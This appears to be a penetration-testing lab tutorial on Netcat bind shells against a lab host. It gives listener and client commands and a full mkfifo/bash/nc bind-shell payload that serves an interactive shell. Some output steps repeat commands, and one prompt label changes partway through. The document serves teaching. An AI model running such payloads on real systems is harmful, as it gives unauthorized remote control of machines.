This means we will be looking to use the terminal emulator application on our local attack box to control the remote system through its shell. This is typically done by using a `Bind` &/or `Reverse` shell.

---

## What Is It?

With a bind shell, the `target` system has a listener started and awaits a connection from a pentester's system (attack box).

- There would have to be a listener already started on the target.
- If there is no listener started, we would need to find a way to make this happen.
- Admins typically configure strict incoming firewall rules and NAT (with PAT implementation) on the edge of the network (public-facing), so we would need to be on the internal network already.
- Operating system firewalls (on Windows & Linux) will likely block most incoming connections that aren't associated with trusted network-based applications.

OS firewalls can be troublesome when establishing a shell since we need to consider IP addresses, ports, and the tool in use to get our connection working successfully. In the example above, the application used to start the listener is called [GNU Netcat](https://en.wikipedia.org/wiki/Netcat). `Netcat` (`nc`) is considered our `Swiss-Army Knife` since it can function over TCP, UDP, and Unix sockets. It's capable of using IPv4 & IPv6, opening and listening on sockets, operating as a proxy, and even dealing with text input and output. We would use nc on the attack box as our `client`, and the target would be the `server`.

## Practicing with GNU Netcat

we will be interacting with an Ubuntu Linux system to understand the nature of a bind shell. To do this, we will be using `netcat` (`nc`) on the client and server.

Once connected to the target box with ssh, start a Netcat listener:

#### No. 1: Server - Target starting Netcat listener

	Target@server:~$ nc -lvnp 7777

the target will be our server, and the attack box will be our client. Once we hit enter, the listener is started and awaiting a connection from the client.

#### No. 2: Client - Attack box connecting to target

	AstraX01@htb[/htb]$ nc -nv 10.129.41.200 7777

 On the client-side, we specify the server's IP address and the port that we configured to listen on (`7777`). Once we successfully connect, we can see a `succeeded!` message on the client as shown above and a `received!` message on the server

#### No. 3: Server - Target receiving connection from client

	Target@server:~$ nc -lvnp 7777

Know that this is not a proper shell. It is just a Netcat TCP session we have established. We can see its functionality by typing a simple message on the client-side and viewing it received on the server-side.

#### No. 4: Client - Attack box sending message Hello Academy

	AstraX01@htb[/htb]$ nc -nv 10.129.41.200 7777

Once we type the message and hit enter, we will notice the message is received on the server-side.

#### No. 5: Server - Target receiving Hello Academy message

	Victim@server:~$ nc -lvnp 7777

## Establishing a Basic Bind Shell with Netcat

We have shown that we can use Netcat to send text between the client and the server, but this is not a bind shell because we cannot interact with the OS and file system. We are only able to pass text within the pipe setup by Netcat. Let's use Netcat to serve up our shell to establish a real bind shell.

On the server-side, we will need to specify the `directory`, `shell`, `listener`, work with some `pipelines`, and `input` & `output` `redirection` to ensure a shell to the system gets served when the client attempts to connect.

#### No. 1: Server - Binding a Bash shell to the TCP session

	Target@server:~$ rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.41.200 7777 > /tmp/f

The commands above are considered our payload, and we delivered this payload manually. We will notice that the commands and code in our payloads will differ depending on the host operating system we are delivering it to.

Back on the client, use Netcat to connect to the server now that a shell on the server is being served.

#### No. 2: Client - Connecting to bind shell on target

	AstraX01@htb[/htb]$ nc -nv 10.129.41.200 7777 
	
	Target@server:~$
